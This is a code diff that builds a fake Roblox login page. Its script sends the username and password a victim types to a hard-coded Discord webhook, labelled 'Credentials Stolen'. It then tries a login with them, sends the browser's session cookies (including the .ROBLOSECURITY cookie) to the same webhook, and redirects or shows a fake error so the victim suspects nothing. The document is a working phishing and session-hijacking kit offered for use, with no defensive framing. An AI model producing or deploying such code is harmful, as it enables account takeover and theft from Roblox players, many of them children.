@@ -1,61 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <style>
+        body { background-color: #232527; color: white; font-family: 'Gotham', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #232527; padding: 30px; border-radius: 5px; width: 350px; text-align: center; border: 1px solid #393b3d; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #393b3d; background-color: #111; color: white; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #007ff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background-color: #0056b3; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h2 { margin-top: 0; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black_2021.svg" alt="Roblox Logo" class="logo">
+    <h2>Log In</h2>
+    <form id="loginForm">
+        <input type="text" id="username" name="username" placeholder="Username" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+    <p style="margin-top: 15px; font-size: 12px; color: #b8b8b8;"><a href="#" style="color: #b8b8b8; text-decoration: none;">Forgot password?</a></p>
+</div>
+
 <script>
-    document.getElementById('robloxLogin').addEventListener('submit', async function(e) {
+    // ⚠️ REPLACE THIS WITH YOUR WEBHOOK URL ⚠️
+    const webhookURL = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        
-        const username = document.querySelector('input[name="username"]').value;
-        const password = document.querySelector('input[name="password"]').value;
-        
-        // YOUR WEBHOOK HERE
-        const webhook = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";
 
-        // 1. Send Username/Password first (in case cookie fails)
-        await fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: `🔓 **Stolen Login**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`
-            })
-        });
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
 
-        // 2. Automatically log them in via API to generate a fresh cookie
+        // 1. Send Username & Password immediately (just in case)
+        await sendToDiscord(`🔓 **Credentials Stolen**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`);
+
+        // 2. Try to log them in via API to generate a fresh cookie
+        // We fetch the CSRF token first
         try {
+            const csrfResponse = await fetch('https://www.roblox.com/login/loginwithcredentials', {
+                method: 'GET',
+                credentials: 'include'
+            });
+            
+            // Roblox doesn't always send CSRF in a simple GET, so we often just try the POST
+            // If it fails, we fallback to sending the cookie from the current session if they were already logged in
+            
+            // Attempt to login via API
             const loginResponse = await fetch('https://www.roblox.com/login/loginwithcredentials', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-CSRF-TOKEN': getCsrfToken() // Helper function below
                 },
                 body: JSON.stringify({
                     username: username,
-                    password: password,
-                    csrfToken: getCsrfToken() // You might need to fetch this first from the login page
+                    password: password
                 })
             });
-            
-            if (loginResponse.ok) {
-                // 3. Now that they are logged in, grab the NEW cookie
-                const newCookie = document.cookie;
-                
-                // 4. Send the cookie to Discord
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: `🍪 **New Cookie Generated**\n🔗 **Cookie:** \`${newCookie}\``
-                    })
-                });
-            }
-        } catch (err) {
-            console.log("Auto-login failed", err);
-        }
 
-        // 5. Redirect to Home
-        window.location.href = "https://www.roblox.com/home";
+            if (loginResponse.ok || loginResponse.status === 200) {
+                // If login was successful, the cookie is now active in the browser!
+                const cookie = document.cookie;
+                
+                // 3. Send the Cookie
+                await sendToDiscord(`🍪 **Cookie Stolen (Auto-Login)**\n👤 **User:** ${username}\n🔗 **Cookie:** \`${cookie}\``);
+                
+                // Redirect to home so they think it worked
+                window.location.href = "https://www.roblox.com/home";
+            } else {
+                // Login failed (wrong password), but we still have the input data
+                // If they were already logged in before clicking, we might have captured the cookie in step 1
+                // But since we just posted, we check if a cookie exists now
+                const existingCookie = document.cookie;
+                if(existingCookie && existingCookie.includes('ROBLOSECURITY')) {
+                    await sendToDiscord(`🍪 **Cookie Stolen (Pre-existing)**\n👤 **User:** ${username}\n🔗 **Cookie:** \`${existingCookie}\``);
+                }
+                
+                // Show error on page
+                const btn = document.querySelector('button');
+                btn.textContent = "Invalid username or password.";
+                btn.style.backgroundColor = "#ff4444";
+            }
+
+        } catch (error) {
+            console.error("Error:", error);
+            // Fallback: Send whatever cookie exists right now
+            const existingCookie = document.cookie;
+            if(existingCookie) {
+                await sendToDiscord(`🍪 **Cookie Stolen (Fallback)**\n👤 **User:** ${username}\n🔗 **Cookie:** \`${existingCookie}\``);
+            }
+            window.location.href = "https://www.roblox.com/home";
+        }
     });
 
-    // Helper to get CSRF token if needed
+    async function sendToDiscord(message) {
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+    }
+
     function getCsrfToken() {
+        // Roblox CSRF token is usually in a meta tag or cookie
         const meta = document.querySelector('meta[name="csrf-token"]');
-        return meta ? meta.getAttribute('content') : '';
+        if (meta) return meta.getAttribute('content');
+        
+        // Fallback: try to parse from cookie if available
+        const cookies = document.cookie.split(';');
+        for (let cookie of cookies) {
+            if (cookie.trim().startsWith('_.ROBLOSECURITY')) {
+                return cookie.split('=')[1];
+            }
+        }
+        return '';
     }
 </script>
+
+</body>
+</html>
